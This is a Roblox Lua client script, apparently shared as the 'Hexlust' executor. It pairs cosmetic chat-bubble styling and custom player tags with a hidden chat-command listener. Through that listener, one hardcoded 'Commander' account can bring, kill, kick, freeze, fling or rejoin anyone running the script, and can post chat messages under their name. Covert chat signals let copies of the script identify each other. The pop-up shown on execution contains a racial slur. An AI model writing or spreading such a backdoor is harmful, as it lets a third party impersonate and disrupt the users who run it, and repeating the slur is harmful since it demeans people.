-- LocalScript - Controllable by UserId 4124175249 (Commander)
-- Anti-double-execute protection

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 8)

if PlayerGui:FindFirstChild("HexlustExecuted") then
    return
end

local marker = Instance.new("BoolValue")
marker.Name = "HexlustExecuted"
marker.Value = true
marker.Parent = PlayerGui

-- ───────────────────────────────────────────────
-- Rest of the script
-- ───────────────────────────────────────────────

-- Dark mode chat bubbles
do
    local function applyDarkBubbles()
        if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then return end
        
        local function styleBubble(bubble)
            if not bubble:IsA("TextLabel") then return end
            bubble.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            bubble.TextColor3 = Color3.fromRGB(240, 240, 240)
            bubble.BackgroundTransparency = 0.1
            bubble.TextStrokeTransparency = 0.8
            bubble.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            
            local corner = bubble:FindFirstChildOfClass("UICorner") or Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 8)
            corner.Parent = bubble
            
            local stroke = bubble:FindFirstChildOfClass("UIStroke") or Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(60, 60, 60)
            stroke.Thickness = 1
            stroke.Transparency = 0.4
            stroke.Parent = bubble
        end
        
        for _, bubble in ipairs(workspace:GetDescendants()) do
            if bubble:IsA("BillboardGui") and bubble.Adornee and bubble.Adornee.Parent and bubble.Adornee.Parent:FindFirstChild("Humanoid") then
                for _, child in ipairs(bubble:GetDescendants()) do
                    styleBubble(child)
                end
            end
        end
        
        workspace.DescendantAdded:Connect(function(desc)
            if desc:IsA("BillboardGui") and desc.Adornee and desc.Adornee.Parent and desc.Adornee.Parent:FindFirstChild("Humanoid") then
                task.delay(0.1, function()
                    for _, child in ipairs(desc:GetDescendants()) do
                        styleBubble(child)
                    end
                end)
            end
        end)
    end

    applyDarkBubbles()
end

-- Small notification
do
    if PlayerGui then
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "HexlustNotify"
        ScreenGui.ResetOnSpawn = false
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.Parent = PlayerGui

        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(0, 240, 0, 50)
        Frame.Position = UDim2.new(0, 40, 0.5, -25)
        Frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
        Frame.BorderSizePixel = 0
        Frame.BackgroundTransparency = 1
        Frame.Parent = ScreenGui

        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 10)
        UICorner.Parent = Frame

        local Shadow = Instance.new("Frame")
        Shadow.Size = UDim2.new(1, 10, 1, 10)
        Shadow.Position = UDim2.new(0, -5, 0, -5)
        Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        Shadow.BackgroundTransparency = 1
        Shadow.ZIndex = -1
        Shadow.Parent = Frame

        local ShadowCorner = Instance.new("UICorner")
        ShadowCorner.CornerRadius = UDim.new(0, 12)
        ShadowCorner.Parent = Shadow

        local Text = Instance.new("TextLabel")
        Text.Size = UDim2.new(1, -20, 1, -10)
        Text.Position = UDim2.new(0, 10, 0, 5)
        Text.BackgroundTransparency = 1
        Text.Text = "you executed hexlust ak nigger!"
        Text.TextColor3 = Color3.fromRGB(255, 255, 255)
        Text.TextSize = 16
        Text.Font = Enum.Font.GothamSemibold
        Text.TextTransparency = 1
        Text.TextScaled = false
        Text.TextWrapped = false
        Text.TextXAlignment = Enum.TextXAlignment.Center
        Text.TextYAlignment = Enum.TextYAlignment.Center
        Text.Parent = Frame

        local GlowText = Text:Clone()
        GlowText.TextTransparency = 1
        GlowText.TextColor3 = Color3.fromRGB(255, 255, 255)
        GlowText.TextStrokeTransparency = 0.5
        GlowText.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
        GlowText.ZIndex = -1
        GlowText.Parent = Frame

        local tweenIn = TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
        local tweenOut = TweenInfo.new(1.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In)

        Frame.BackgroundTransparency = 1
        Text.TextTransparency = 1
        GlowText.TextTransparency = 1
        GlowText.TextStrokeTransparency = 1
        Shadow.BackgroundTransparency = 1
        Frame.Size = UDim2.new(0, 210, 0, 42)

        TweenService:Create(Frame, tweenIn, {BackgroundTransparency = 0.14, Size = UDim2.new(0, 240, 0, 50)}):Play()
        TweenService:Create(Text, tweenIn, {TextTransparency = 0}):Play()
        TweenService:Create(GlowText, tweenIn, {TextTransparency = 0.35, TextStrokeTransparency = 0.5}):Play()
        TweenService:Create(Shadow, tweenIn, {BackgroundTransparency = 0.84}):Play()

        task.delay(2.2, function()
            TweenService:Create(Frame, tweenOut, {BackgroundTransparency = 1, Size = UDim2.new(0, 190, 0, 38)}):Play()
            TweenService:Create(Text, tweenOut, {TextTransparency = 1}):Play()
            TweenService:Create(GlowText, tweenOut, {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
            TweenService:Create(Shadow, tweenOut, {BackgroundTransparency = 1}):Play()

            task.delay(1.5, function()
                if ScreenGui then ScreenGui:Destroy() end
            end)
        end)
    end
end

-- General chat channel
local GeneralChannel
pcall(function()
    local TextChannels = TextChatService:WaitForChild("TextChannels", 20)
    GeneralChannel = TextChannels:WaitForChild("RBXGeneral", 20)
end)
if not GeneralChannel then
    warn("RBXGeneral not found - chat commands & tag sync disabled")
end

-- Helpers
local function getPlayerByPartial(partial)
    if not partial or partial == "" then return nil end
    local lower = partial:lower()
    for _, plr in Players:GetPlayers() do
        if plr.DisplayName:lower():sub(1, #lower) == lower 
           or plr.Name:lower():sub(1, #lower) == lower then
            return plr
        end
    end
    return nil
end

local function getCommander()
    return Players:GetPlayerByUserId(4124175249)
end

-- Freeze state
local isFrozen = false
local origWalkSpeed = 16
local origJumpPower = 50

if LocalPlayer.Character then
    local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if h then
        origWalkSpeed = h.WalkSpeed
        origJumpPower = h.JumpPower
    end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    local h = char:WaitForChild("Humanoid", 10)
    if h then
        origWalkSpeed = h.WalkSpeed
        origJumpPower = h.JumpPower
        if isFrozen then
            h.WalkSpeed = 0
            h.JumpPower = 0
        end
    end
end)

-- ───────────────────────────────────────────────
--          CUSTOM TAGS (4 tiers)
-- ───────────────────────────────────────────────

local safeLP = Players.LocalPlayer

local REGULAR_ASSET       = "rbxassetid://87737612757214"      -- executed members
local OWNER_ASSET         = "rbxassetid://81991054282907"      -- owner
local SPECIAL_ASSET_1     = "rbxassetid://132746100285086"      -- special 1
local SPECIAL_ASSET_2     = "rbxassetid://139892439298259"     -- special 2
local SPECIAL_ASSET_3     = "rbxassetid://102496698805931"     -- new special

local OWNER_USERID        = 4124175249
local SPECIAL_USERID_1    = 9601915641
local SPECIAL_USERID_2    = 174386419
local SPECIAL_USERID_3    = 1856438224

local SIZE = UDim2.new(0, 32, 0, 32)
local OFF_X = 1.3
local OFF_Y = 1.2

local function addTag(char, userid)
    if not char then return end
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head")
    if head:FindFirstChild("HexlustTag") then return end

    task.wait(1)

    local bb = Instance.new("BillboardGui")
    bb.Name = "HexlustTag"
    bb.Adornee = head
    bb.Size = SIZE
    bb.StudsOffset = Vector3.new(OFF_X, OFF_Y, 0)
    bb.AlwaysOnTop = true
    bb.LightInfluence = 0
    bb.MaxDistance = 2000
    bb.ResetOnSpawn = false
    bb.Parent = head

    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(1, 0, 1, 0)
    img.BackgroundTransparency = 1
    img.ScaleType = Enum.ScaleType.Fit

    if userid == OWNER_USERID then
        img.Image = OWNER_ASSET
    elseif userid == SPECIAL_USERID_1 then
        img.Image = SPECIAL_ASSET_1
    elseif userid == SPECIAL_USERID_2 then
        img.Image = SPECIAL_ASSET_2
    elseif userid == SPECIAL_USERID_3 then
        img.Image = SPECIAL_ASSET_3
    else
        img.Image = REGULAR_ASSET  -- executed member
    end

    img.Parent = bb
end

local known = {}

local function tryTagPlayer(plr)
    if not plr then return end
    if known[plr.UserId] then return end
    known[plr.UserId] = true
    if plr.Character then
        task.spawn(function() addTag(plr.Character, plr.UserId) end)
    end
    plr.CharacterAdded:Connect(function(char)
        task.spawn(function() addTag(char, plr.UserId) end)
    end)
end

tryTagPlayer(safeLP)

local cmdr = Players:GetPlayerByUserId(OWNER_USERID)
if cmdr then tryTagPlayer(cmdr) end

local special1 = Players:GetPlayerByUserId(SPECIAL_USERID_1)
if special1 then tryTagPlayer(special1) end

local special2 = Players:GetPlayerByUserId(SPECIAL_USERID_2)
if special2 then tryTagPlayer(special2) end

local special3 = Players:GetPlayerByUserId(SPECIAL_USERID_3)
if special3 then tryTagPlayer(special3) end

-- Tag sync via chat – both signals apply correct tag
local ch = GeneralChannel
if ch then
    local INITIAL_SIGNAL  = "♪؍؍"
    local RESPONSE_SIGNAL = "♪♪♪"

    task.delay(4, function()
        pcall(ch.SendAsync, ch, INITIAL_SIGNAL)
    end)

    ch.MessageReceived:Connect(function(msg)
        if not msg.TextSource then return end
        local id = msg.TextSource.UserId
        local text = msg.Text

        if id == safeLP.UserId then return end

        if text == INITIAL_SIGNAL or text == RESPONSE_SIGNAL then
            if not known[id] then
                local p = Players:GetPlayerByUserId(id)
                if p then 
                    -- Use the correct asset based on who they are
                    tryTagPlayer(p)
                end
            end

            if text == INITIAL_SIGNAL then
                task.delay(0.8, function()
                    pcall(ch.SendAsync, ch, RESPONSE_SIGNAL)
                end)
            end
        end
    end)
end

Players.PlayerAdded:Connect(function(plr)
    if plr.UserId == OWNER_USERID or plr.UserId == SPECIAL_USERID_1 or plr.UserId == SPECIAL_USERID_2 or plr.UserId == SPECIAL_USERID_3 then
        tryTagPlayer(plr)
    end
end)

task.spawn(function()
    while true do
        task.wait(10)
        for id in pairs(known) do
            local p = Players:GetPlayerByUserId(id)
            if p and p.Character and p.Character:FindFirstChild("Head") and not p.Character.Head:FindFirstChild("HexlustTag") then
                addTag(p.Character, id)
            end
        end
    end
end)

-- ───────────────────────────────────────────────
--                   COMMANDS
-- ───────────────────────────────────────────────

if GeneralChannel then
    GeneralChannel.MessageReceived:Connect(function(msg)
        if not msg.TextSource then return end
        if msg.TextSource.UserId ~= OWNER_USERID then return end

        local text = msg.Text
        local lowerText = text:lower()
        local args = string.split(lowerText, " ")
        if #args < 1 then return end

        local cmd = args[1]

        local function affectsTarget(tgtArg)
            return tgtArg == "all" or 
                   LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg or
                   LocalPlayer.Name:lower():sub(1, #tgtArg) == tgtArg
        end

        if cmd == "?bring" and #args >= 2 then
            local tgtArg = args[2]
            local destPlayer = nil
            
            local toIndex
            for i = 3, #args do
                if args[i] == "to" then 
                    toIndex = i 
                    break 
                end
            end
            
            if toIndex and toIndex + 1 <= #args then
                local destName = table.concat(args, " ", toIndex + 1)
                destPlayer = getPlayerByPartial(destName)
            end

            if affectsTarget(tgtArg) then
                local toPivot
                if destPlayer and destPlayer.Character and destPlayer.Character.PrimaryPart then
                    toPivot = destPlayer.Character:GetPivot()
                else
                    local commander = getCommander()
                    if commander and commander.Character and commander.Character.PrimaryPart then
                        toPivot = commander.Character:GetPivot()
                    end
                end
                
                if toPivot and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
                    LocalPlayer.Character:PivotTo(toPivot)
                end
            end

        elseif cmd == "?chat" and #args >= 3 then
            local tgtArg = args[2]
            local msgStart = text:find(" ", text:find(" ", 1) + 1) or #text
            local chatText = text:sub(msgStart + 1):match("^%s*(.-)%s*$")
            
            if chatText ~= "" and affectsTarget(tgtArg) then
                task.spawn(function()
                    pcall(GeneralChannel.SendAsync, GeneralChannel, chatText)
                end)
            end

        elseif cmd == "?kill" and #args >= 2 then
            if affectsTarget(args[2]) and LocalPlayer.Character then
                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if h then h.Health = 0 end
            end

        elseif cmd == "?kick" and #args >= 2 then
            if affectsTarget(args[2]) then 
                LocalPlayer:Kick("sorri twin dada kicked u ;c") 
            end

        elseif cmd == "?rj" and #args >= 2 then
            local tgtArg = args[2]
            if affectsTarget(tgtArg) then
                local msg = LocalPlayer.DisplayName .. " is getting rebooted..."
                task.spawn(function()
                    pcall(GeneralChannel.SendAsync, GeneralChannel, msg)
                end)
                
                task.delay(0.4, function()
                    pcall(function()
                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
                    end)
                end)
            end

        elseif cmd == "?freeze" and #args >= 2 then
            if affectsTarget(args[2]) and LocalPlayer.Character then
                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if h then
                    isFrozen = true
                    h.WalkSpeed = 0
                    h.JumpPower = 0
                end
            end

        elseif cmd == "?unfreeze" and #args >= 2 then
            if affectsTarget(args[2]) and LocalPlayer.Character then
                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if h then
                    isFrozen = false
                    h.WalkSpeed = origWalkSpeed
                    h.JumpPower = origJumpPower
                end
            end

        elseif cmd == "?fling" and #args >= 2 then
            if affectsTarget(args[2]) and LocalPlayer.Character then
                local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if root and hum then
                    hum.PlatformStand = true
                    hum:ChangeState(Enum.HumanoidStateType.Physics)

                    for _, child in root:GetChildren() do
                        if child:IsA("Attachment") or child:IsA("LinearVelocity") or child:IsA("AngularVelocity") then
                            child:Destroy()
                        end
                    end

                    local attach = Instance.new("Attachment")
                    attach.Name = "FlingAttach"
                    attach.Parent = root

                    local linVel = Instance.new("LinearVelocity")
                    linVel.Attachment0 = attach
                    linVel.MaxAxesForce = Vector3.new(1e6, 1e6, 1e6)
                    linVel.VectorVelocity = Vector3.new(
                        math.random(-60, 60),
                        math.random(250, 350),
                        math.random(-60, 60)
                    )
                    linVel.Parent = root

                    local angVel = Instance.new("AngularVelocity")
                    angVel.Attachment0 = attach
                    angVel.MaxTorque = 1e6
                    angVel.AngularVelocity = Vector3.new(
                        math.random(-25,25),
                        math.random(-50,50),
                        math.random(-25,25)
                    )
                    angVel.Parent = root

                    task.delay(9, function()
                        if linVel then linVel:Destroy() end
                        if angVel then angVel:Destroy() end
                        if attach then attach:Destroy() end
                        if hum and hum.Health > 0 then
                            hum.PlatformStand = false
                            local explode = Instance.new("Explosion")
                            explode.Position = root.Position + Vector3.new(0,5,0)
                            explode.BlastPressure = 0
                            explode.BlastRadius = 8
                            explode.DestroyJointRadiusPercent = 0
                            explode.Parent = workspace
                            hum.Health = 0
                        end
                    end)
                end
            end
        end
    end)
end
